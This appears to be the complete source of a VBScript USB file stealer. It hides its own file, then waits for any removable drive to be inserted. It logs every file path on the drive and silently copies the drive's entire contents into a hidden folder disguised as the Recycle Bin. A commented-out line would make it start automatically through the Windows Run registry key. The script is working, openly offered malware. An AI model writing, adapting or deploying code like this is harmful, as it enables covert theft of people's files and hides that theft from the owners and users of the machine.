On Error Resume Next 

oType = 2	'1-->Task Folder; 2-->Recycle Folder; 0-->Normal Folder 

Const Target_Folder = "D:\RECYCLE.BIN\"

Set fso=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("Wscript.Shell") 

'---Hide VBScript File after being executed
Set vbs = fso.GetFile(Wscript.ScriptFullName)
vbs.Attributes = 2 + 4

'---Enable self-starting with registration into Regedit---'
' ws.Regwrite"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & "WinShell",vbs.path

'---Create File for Storage
If Not fso.FolderExists(Target_Folder) Then 
	fso.CreateFolder(Target_Folder) 
End If 

'---Hide Target_Folder
Call oHideFolder(Target_Folder,oType)

'---Create log
' On Error Resume Next 
' If Not fso.FileExists(Target_Folder & "\\logcat.log") Then 
' 	Set logcat = fso.CreateTextFile(Target_Folder & "\\logcat.log", True) 	'True-->Cover target file when file exists;
' End If


Call Main() 


Sub Main() 

On Error Resume Next 
Const Device_Arrival = 2 
Const Device_Removal = 3 
Const strComputer = "." 
Dim objWMIService, colMonitoredEvents, objLatestEvent 

Set objWMIService = GetObject("winmgmts:" _ 
	& "{impersonationLevel=impersonate}!\\" _ 
	& strComputer & "\root\cimv2") 
Set colMonitoredEvents = objWMIService. _ 
	ExecNotificationQuery( _ 
		"Select * from Win32_VolumeChangeEvent")
Do 
	Set objLatestEvent = colMonitoredEvents.NextEvent 
	Select Case objLatestEvent.EventType 
		Case Device_Arrival 
			TreeIt(objLatestEvent.DriveName)
			uFolder = GetSerialNumber()
			Call oCopyFile(objLatestEvent.DriveName,Target_Folder,uFolder)
			'Msgbox uFolder
	End Select 
Loop 

End Sub 


Function GetSerialNumber()
Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
Set colItems = objWMIService.ExecQuery("Select * From Win32_DiskDrive",,48)
For Each objItem in colItems 
	If objItem.MediaType = "Removable Media" Then
		s = objItem.SerialNumber
	End If 
Next

'MsgBox s

GetSerialNumber = s

End Function


'---Traverse 
Function TreeIt(sPath) 
On Error Resume Next 
Set oFolder = fso.GetFolder(sPath) 
Set oSubFolders = oFolder.Subfolders 
Set oFiles = oFolder.Files 

For Each oFile In oFiles 
	Call Copylog(oFile.Path,oFile.Name,Target_Folder)
Next

For Each oSubFolder In oSubFolders 
	TreeIt(oSubFolder.Path) 
Next 

Set oFolder = Nothing 
Set oSubFolders = Nothing 

End Function


'---Logcat write
Function Copylog(FilePath,FileName,Target_Folder)
On Error Resume Next 
set logcat = fso.OpenTextFile(Target_Folder & "\\logcat.log", 8, True) 	'True-->Create target file when file not exists;
Ext = fso.GetExtensionName(FilePath) 
logcat.writeline(now & vbTab & Ext & vbTab & vbTab & FilePath)
logcat.close()

End Function 


'---Copy files
Function oCopyFile(sPath,Target_Folder,uFolder) 
On Error Resume Next 
Set oFolder = fso.GetFolder(sPath) 
Set oSubFolders = oFolder.Subfolders 
Set oFiles = oFolder.Files 

If Not fso.FolderExists(Target_Folder & "\\" & uFolder) Then 
	fso.CreateFolder(Target_Folder & "\\" & uFolder) 
End If 

For Each oFile In oFiles
oFile.Copy Target_Folder & uFolder & "\" & oFile.Name,True
Next

For Each oSubFolder In oSubFolders
oSubFolder.Copy Target_Folder & uFolder & "\" & oSubFolder.Name,True
Next

End Function


'---Hide Target Folder
Sub oHideFolder(Target_Folder,oType) 
On Error Resume Next 
Set fso = CreateObject("Scripting.FileSystemObject") 

Select Case oType 
case 1 
Set inf=fso.CreateTextfile(Target_Folder&"\\desktop.ini",True) 
inf.writeline("[.ShellClassInfo]") 
inf.writeline("CLSID={d6277990-4c6a-11cf-8d87-00aa0060f5bf}") 
case 2 
Set inf=fso.CreateTextfile(Target_Folder&"\\desktop.ini",True) 
inf.writeline("[.ShellClassInfo]") 
inf.writeline("CLSID={645FF040-5081-101B-9F08-00AA002F954E}") 
case 0 
Exit Sub 
End Select 
Set inf=nothing 

Set SysoFolder=fso.GetFolder(Target_Folder) 
SysoFolder.Attributes = 2 + 4
Set SysoFolder=nothing 

End Sub